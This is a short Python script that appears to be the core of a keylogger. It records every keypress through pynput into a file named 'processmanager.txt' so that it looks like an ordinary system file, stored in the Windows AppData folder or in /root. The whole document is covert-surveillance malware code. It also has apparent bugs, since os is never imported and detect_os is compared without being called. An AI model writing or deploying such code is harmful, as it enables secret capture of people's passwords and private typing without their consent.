from detect import detect_os
from file_edit import write_file, file
from pynput.keyboard import Listener

if detect_os == 1:
    path = os.environ['appdata'] +'\\processmanager.txt'  
    file(path) 
elif detect_os == 2:
    path = '/root/processmanager.txt'
    file(path)

try:
    with Listener(on_press=write_file) as listener:
        listener.join()
except KeyboardInterrupt as e:
    print(e)